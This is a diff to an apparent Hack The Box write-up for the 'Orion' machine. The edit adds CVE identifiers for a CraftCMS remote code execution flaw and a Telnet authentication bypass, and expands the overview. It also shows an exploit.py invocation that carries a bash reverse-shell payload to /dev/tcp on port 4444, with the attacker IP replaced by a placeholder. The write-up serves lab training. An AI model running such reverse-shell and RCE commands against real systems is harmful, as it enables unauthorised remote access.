@@ -40,13 +40,13 @@ mermaid: true
 | Platform | [HackTheBox](https://www.hackthebox.com/) |
 | OS | Linux |
 | Difficulty | Easy |
-| Initial Access | CraftCMS RCE |
-| Privilege Escalation | Telnet Authentication Bypass |
+| Initial Access | CraftCMS RCE (CVE-2025-32432) |
+| Privilege Escalation | Telnet Authentication Bypass (CVE-2026-24061) |
 
 ## 2. Attack Path
 
 ```
-CraftCMS RCE
+CraftCMS RCE (CVE-2025-32432)
       ↓
 Environment Variable Disclosure
       ↓
@@ -56,14 +56,16 @@ Password Cracking
       ↓
 SSH Access (adam)
       ↓
-Telnet Authentication Bypass
+Telnet Authentication Bypass (CVE-2026-24061)
       ↓
 Root Access
 ```
 
 ## 3. Overview
 
-Orion is a Linux machine that focuses on web exploitation and local privilege escalation. The initial foothold was obtained by exploiting a vulnerable CraftCMS installation, followed by credential extraction and a Telnet authentication bypass vulnerability for root access.
+**Orion** is an easy-difficulty Linux machine on **Hack The Box** that demonstrates real-world web application exploitation, database credential dumping, and service-based privilege escalation. 
+
+The initial foothold is achieved by exploiting a Remote Code Execution (RCE) vulnerability in **CraftCMS** (**CVE-2025-32432**). Inspecting the application environment variables exposes database credentials, allowing extraction and offline cracking of `bcrypt` password hashes. After obtaining user SSH access as `adam`, root administrative access is obtained by exploiting a Telnet authentication bypass vulnerability (**CVE-2026-24061**).
 
 ## 4. Reconnaissance
 
@@ -126,7 +128,7 @@ The exploit automates:
 ┌──(venv)─(kali㉿kali)-[~/…/HTB/machines/orion/CVE-2025-32432-POC]
 └─$ python3 exploit.py \                           
   -u http://orion.htb \  
-  -c "bash -lc 'setsid bash -c \"bash -i >& /dev/tcp/10.10.17.229/4444 0>&1\" >/dev/null 2>&1 &'" \
+  -c "bash -lc 'setsid bash -c \"bash -i >& /dev/tcp/[IP]/4444 0>&1\" >/dev/null 2>&1 &'" \
   --timeout 0
 [*] Target: http://orion.htb
 [*] Front controller: index.php
